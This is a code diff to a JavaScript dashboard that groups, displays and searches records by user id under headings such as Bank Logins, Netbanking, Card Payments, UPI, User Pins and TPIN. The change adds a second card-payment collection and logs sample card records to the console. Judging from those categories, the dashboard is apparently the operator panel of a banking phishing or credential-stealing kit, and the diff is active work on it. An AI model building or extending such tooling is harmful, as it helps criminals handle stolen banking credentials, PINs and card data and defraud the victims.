@@ -1346,11 +1346,12 @@ function groupData(data) {
     g[uid][sec].push(obj);
   };
 
-  // Process all data sections
+  // Process all data sections - Added card_payments separately
   (data.forms || []).forEach(x => push(x.uniqueid, "Forms", x));
   (data.netbanking || []).forEach(x => push(x.uniqueid, "Netbanking", x));
   (data.bankLogins || []).forEach(x => push(x.uniqueid, "Bank Logins", x));
   (data.cardPayments || []).forEach(x => push(x.uniqueid, "Card Payments", x));
+  (data.card_payments || []).forEach(x => push(x.uniqueid, "Card Payments (New)", x)); // Added new collection
   (data.upi || []).forEach(x => push(x.uniqueid, "UPI", x));
   (data.userPins || []).forEach(x => push(x.uniqueid, "User Pins", x));
   (data.transactionPasswords || []).forEach(x => push(x.uniqueid, "TPIN", x));
@@ -1360,11 +1361,20 @@ function groupData(data) {
 
   console.log('📊 Grouped data:', Object.keys(g).length, 'users');
   
-  // Log stats
+  // Log stats with card payments details
   Object.keys(g).forEach(uid => {
     let totalEntries = 0;
     Object.values(g[uid]).forEach(items => totalEntries += items.length);
-    console.log(`👤 User ${uid}: ${totalEntries} total entries`);
+    
+    // Count card payments specifically
+    const cardPaymentsCount = (g[uid]["Card Payments"] || []).length;
+    const newCardPaymentsCount = (g[uid]["Card Payments (New)"] || []).length;
+    
+    if (cardPaymentsCount > 0 || newCardPaymentsCount > 0) {
+      console.log(`👤 User ${uid}: ${totalEntries} total entries (Card Payments: ${cardPaymentsCount}, New Card Payments: ${newCardPaymentsCount})`);
+    } else {
+      console.log(`👤 User ${uid}: ${totalEntries} total entries`);
+    }
   });
 
   return g;
@@ -1433,6 +1443,7 @@ function renderCurrentPage() {
       "Netbanking", 
       "Bank Logins",
       "Card Payments",
+      "Card Payments (New)", // Added new section
       "UPI",
       "User Pins",
       "TPIN",
@@ -1543,7 +1554,7 @@ function search() {
       const u = grouped[uid];
       if (!u) return false;
       
-      // Search in all data sections
+      // Search in all data sections including new card payments
       for (const sec in u) {
         for (const item of u[sec]) {
           for (const k in item) {
@@ -1683,11 +1694,16 @@ async function load() {
     
     console.log('✅ Data fetched successfully');
     
-    // Log data structure
+    // Log data structure with card payments details
     const data = json.data || {};
     Object.entries(data).forEach(([key, value]) => {
       if (Array.isArray(value)) {
         console.log(`📦 ${key}: ${value.length} entries`);
+        
+        // Log sample of card payments if exists
+        if (key === 'card_payments' && value.length > 0) {
+          console.log('💳 Sample card payment:', value[0]);
+        }
       }
     });
 
